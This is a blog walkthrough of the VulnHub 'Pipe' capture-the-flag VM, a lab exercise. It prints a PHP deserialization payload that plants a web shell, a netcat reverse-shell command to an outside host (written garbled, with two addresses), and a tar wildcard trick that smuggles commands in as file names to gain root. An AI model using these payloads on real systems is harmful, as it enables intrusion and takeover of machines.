@@ -1,0 +1,83 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Pipe VM (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-pipe-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-01-28T16:15:09+00:00">January 28, 2017</time><time class="updated" datetime="2025-06-10T20:30:18+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “PIPE” of the vulnhub lab’s design by Mr. Sagi. The level of this challenge is not so tough and its difficulty level is labeled as a medium. Solving this lab will give you a good experience of penetration testing.</span></p>
+<p><span style="color: #000000;">You can download it from here: https://www.vulnhub.com/entry/devrandom-pipe,124/</span></p>
+<ul>
+<li><span style="color: #000000;">Penetrating Methodologies:</span></li>
+<li><span style="color: #000000;">Network Scanning (Nmap, Netdiscover)</span></li>
+<li><span style="color: #000000;">Abusing HTTP service (Burp Suite)</span></li>
+<li>Exploiting js serialization for remote code execution</li>
+<li>Insert netcat reverse_shell payload</li>
+<li>Spawn TTY shell</li>
+<li>Wildcard privilege escalation</li>
+<li>capture the flag</li>
+</ul>
+<p><span style="color: #000000;"><strong>Let’s Begin!!</strong></span></p>
+<p><span style="color: #000000;">Start with the netdiscover command to identify target IP in the local network, in my network 192.168.1.104 is my target IP, you will get yours.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-WAap_i4Uy_s/W2MfBJ_nXfI/AAAAAAAAZDk/c4KzEBl8NK4T7bRiDA3Rdkr9CCHfsaz3wCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Further, let’s enumerate open ports and protocols information of the target’s network with help of nmap following command:</span></p>
+<pre class="lang:default decode:true">nmap -p- -A 192.168.1.104 --open</pre>
+<p><span style="color: #000000;">And from here we get open ports 22, 80, 111, 54073</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-aKDvBRDMslE/W2MfEVlhq3I/AAAAAAAAZEM/KUZMXR7l7_4r5-lP-P9rEqFYzp-LKc5mACLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Now we will open target IP in the browser as port 80 is active. Here the website reflects off unauthorized message with a login page. On the login window, it written “the site says: index.php” which we will be using later on.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5YWL6rk4TsI/W2MfE2qYGeI/AAAAAAAAZEU/sdB4sN9x-PoArFe5vpMz4JEfRvxNS91nQCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Now using burpsuite we are going to capture the cookies for login page by setting manual proxy of Firefox browser. It has intercepted data for the login page. Here we will change the HTTP-GET method into HTTP-POST.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-sH9IwSD5Pfw/W2MfFE5N6xI/AAAAAAAAZEc/-x33dCAMMAso8kPZPwhCfIEqFNciLLYBQCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">As shown in the below image replace GET from POST/index.php and then forward the intercepted request.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OL2ZfYbxTUA/W2MfFL2kJ9I/AAAAAAAAZEY/ruhfVVu4RYss_D9XcV2DrrPCmN7oNEVEwCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Ok! To above step leads us to a website which shows a PIPE picture and a link below it to get <strong><em>Show</em></strong> <strong><em>artist info</em></strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-lYN35wh29ew/W2MfF9kavWI/AAAAAAAAZEg/VM-r5UzYZngjDLO38cZtTU4X8l1y5FKZgCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">As we cannot see anything else on this web page so we opened the page source code. It shows an accessible directory <strong><em>scriptz/php.js</em></strong> in its script content.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Kwzkyw0TKsU/W2MfGKU_OeI/AAAAAAAAZEk/3g-EXAsgwU47VlBaTt03w3LuBu94FDVLACLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Now open target IP with <em>/scriptz</em> in the browser, and you will notice some file or scripts are present here. Download both files for further enumeration.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yl1M0Xdq07U/W2MfGcG4_7I/AAAAAAAAZEo/sKekYLbElvY-FE-sROUiRhxYDEcBdfj8ACLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">So first we open <strong><em>php.js</em></strong> file here we found it is serializing some data and after that, we open <strong><em>log.php.bak </em></strong>which works with the js file for serialization.</span></p>
+<p><span style="color: #000000;">Then I search in Google and found Deserialization vulnerabilities in JS </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-OXRhwHj1OO8/W2MfBcapqXI/AAAAAAAAZDo/7W-bNTSOTlURxkmLCns9xeaFwRz2SR0GwCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Now again returning to our original web page, and click on the link given below of the Pipe image and capture cookies that request in a burp.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-CN5z-VGZdcs/W2MfBaISGAI/AAAAAAAAZDs/pWN0Dtjymb8my1XFvfU1D8SfN3sZdJ4QwCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Select the parameter and send it for decoding in the smart decoder, in the image below red highlighted text is decoded and the result is shown in below window the code which is given in bottom window need to be altered so that we can upload our malicious code.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-oebJtol3VbA/W2MfCMmjlnI/AAAAAAAAZDw/Ia1WJtMWm_chhqDlfXLTA4VtTqDyGorogCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Now modify the param with the following code for remote code execution and then forward the request.</span></p>
+<pre class="lang:default decode:true">O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" &lt;?php echo '&lt;pre&gt;'; system($_GET['cmd']); echo '&lt;/pre&gt;'; ?&gt;";}</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-3CQwUMxKqpI/W2MfCNNR-RI/AAAAAAAAZD0/FvVXmhef4kIBc06HVQ7ViT6gJrXJKX_lgCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Check your shell.php file is uploaded in that accessible directory.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-OjqqFCtHZio/W2MfCSTxEdI/AAAAAAAAZD4/ZiV-MW2rKNYU5wAkAhgpDaS-RCASsugOgCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Now we have uploaded shell it’s time to open it see what it gives us. As we have executed the code for cmd, we will type cmd in URL as well.</span></p>
+<p><span style="color: #000000;">cmd=id</span></p>
+<p><span style="color: #000000;">It will dump the id of current user i.e. www-data.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-rQooYuphfwg/W2MfDK5NxCI/AAAAAAAAZEA/fR4zi9lTVL46JwiEu3buB7uUr2PA8pemQCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Now let’s try to spawn tty shell of the victim’s machine with help of netcat payload: nc 10.0.0.1 1234 -e /bin/bash 192.168.1.107 1234</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5QTGQTCjKpM/W2MfDOF_m0I/AAAAAAAAZEE/T8QrL5H_Kt4xccuFdCtl5jvrLAhGGCHGwCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Then start netcat listener and then execute the payload to spawn tty shell of victim’s machine.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234</pre>
+<p><span style="color: #000000;">As you can observe we have successfully compromised the target machine and run the following command for gaining root access.</span></p>
+<pre class="lang:default decode:true ">python -c 'import pty; pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">Then we check for any cronjobs running on the system via cat command we can see a couple of cron jobs running which interest us. In /etc/crontab the script /usr/bin/compress.sh which is world readable now follow the below steps</span></p>
+<pre class="lang:default decode:true">cat /etc/crontab
+cat /usr/bin/compress.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LNmLV6XDmNg/W2MfDMZqAtI/AAAAAAAAZD8/h35zThe74uoNREYIvogz2qLkQtTXP64AwCLcBGAs/s1600/17.png"/></span></p>
+<pre class="lang:default decode:true">cd /home/rene/backup
+ls
+echo "chmod u+s /usr/bin/find" &gt; test.sh
+echo "" &gt; "--checkpoint-action=exec=sh test.sh"
+echo "" &gt; --checkpoint=1
+ls -al /usr/bin/find
+touch raj
+find raj -exec "/bin/sh" \;</pre>
+<p><span style="color: #000000;">Yuppie!! We got the root access.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-guqRrflsajY/W2MfEf2c8MI/AAAAAAAAZEI/fUtZdegh_kQldsImuPn5ybi3hJ6tkADPQCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">At last open, the flag.txt file and we have our flag.</span></p>
+<p><span style="color: #000000;">Mission accomplished!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7_us0OMvWPQ/W2MfEWjOe-I/AAAAAAAAZEQ/MmmPUGXpDPIKqHO7y8gz-KxiJfrUTC80wCLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yugam Yadav</strong> is a passionate Researcher and Technical Writer at Hacking Articles. he is a hacking enthusiast. Contact <a href="https://www.linkedin.com/in/yugam-yadav-99b56566/"><strong>Here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
